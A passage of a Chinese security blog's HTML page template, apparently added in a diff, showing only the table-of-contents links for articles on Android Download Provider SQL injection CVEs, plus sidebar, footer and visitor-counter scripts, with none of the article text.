href="#1-CVE-2018-9493-Download-Provider-SQL%E6%B3%A8%E5%85%A5"><span class="nav-text">1.CVE-2018-9493: Download Provider SQL注入</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-3"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-3"><span class="nav-text">（2）漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4"><span class="nav-text">（3）安全防护</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2-Android-Download-Provider%E4%B8%8A%E7%9A%84SQL%E6%B3%A8%E5%85%A5%E2%80%94%E2%80%94sort%E5%8F%82%E6%95%B0%EF%BC%88CVE-2019-2196%EF%BC%89"><span class="nav-text">2.Android Download Provider上的SQL注入——sort参数（CVE-2019-2196）</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%881%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86-4"><span class="nav-text">（1）漏洞原理</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%882%EF%BC%89%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0-4"><span class="nav-text">（2）漏洞复现</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%EF%BC%883%EF%BC%89%E5%AE%89%E5%85%A8%E9%98%B2%E6%8A%A4-1"><span class="nav-text">（3）安全防护</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E6%80%BB%E7%BB%93"><span class="nav-text">六、总结</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE%EF%BC%9A"><span class="nav-text">参考文献：</span></a></li></ol></div>
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="安全后厨团队"
+      src="/images/avatar.png">
+  <p class="site-author-name" itemprop="name">安全后厨团队</p>
+  <div class="site-description" itemprop="description">选择有时候比努力更重要</div>
+</div>
+<div class="site-state-wrap motion-element">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">48</span>
+          <span class="site-state-item-name">日志</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-name">分类</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">17</span>
+        <span class="site-state-item-name">标签</span></a>
+      </div>
+  </nav>
+</div>
+  <div class="links-of-author motion-element">
+      <span class="links-of-author-item">
+        <a href="https://github.com/WindXaa" title="GitHub → https:&#x2F;&#x2F;github.com&#x2F;WindXaa" rel="noopener" target="_blank"><i class="github fa-fw"></i>GitHub</a>
+      </span>
+      <span class="links-of-author-item">
+        <a href="https://bbs.pediy.com/user-home-905443.htm" title="看雪 → https:&#x2F;&#x2F;bbs.pediy.com&#x2F;user-home-905443.htm" rel="noopener" target="_blank"><i class="gratipay fa-fw"></i>看雪</a>
+      </span>
+  </div>
+
+
+
+      </div>
+	  
+	  <div class="wechat_OA">
+		<span><b>公众号</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website/weChat.jpg" alt="二维码">
+	  </div>
+	  <div class="wechat_OA">
+		<span><b>知识星球</b></span>
+		<br>
+		<!-- 这里添加你的二维码图片 -->
+		<img src="https://blog-1307040378.cos.ap-chengdu.myqcloud.com/blog-website%2Fstar.png" alt="知识星球">
+	  </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer class="footer">
+      <div class="footer-inner">
+        
+
+        
+
+<div class="copyright">
+  
+  &copy; 2022-12 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">安全后厨团队</span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+<div class="theme-info">
+  <div class="powered-by"></div>
+  <span class="post-count">博客全站共184.3k字</span>
+</div>
+
+    <script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+    <span id="busuanzi_container_site_pv">总访问量<span id="busuanzi_value_site_pv"></span>次</span>
+    <span class="post-meta-divider">|</span>
+    <span id="busuanzi_container_site_uv">总访客数<span id="busuanzi_value_site_uv"></span>人</span>
+    <span class="post-meta-divider">|</span>
+<!-- 不蒜子计数初始值纠正 -->
+<script>
+$(document).ready(function() {
+
+    var int = setInterval(fixCount, 50);  // 50ms周期检测函数
+    var countOffset = 20000;  // 初始化首次数据
+
+    function fixCount() {            
+       if (document.getElementById("busuanzi_container_site_pv").style.display != "none")
+        {
+            $("#busuanzi_value_site_pv").html(parseInt($("#busuanzi_value_site_pv").html()) + countOffset); 
+            clearInterval(int);
+        }                  
+        if ($("#busuanzi_container_site_pv").css("display") != "none")
+        {
+            $("#busuanzi_value_site_uv").html(parseInt($("#busuanzi_value_site_uv").html()) + countOffset); // 加上初始数据 
+            clearInterval(int); // 停止检测
+        }  
+    }
+       	
+});
+</script> 
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+  
+<script src="/js/local-search.js"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
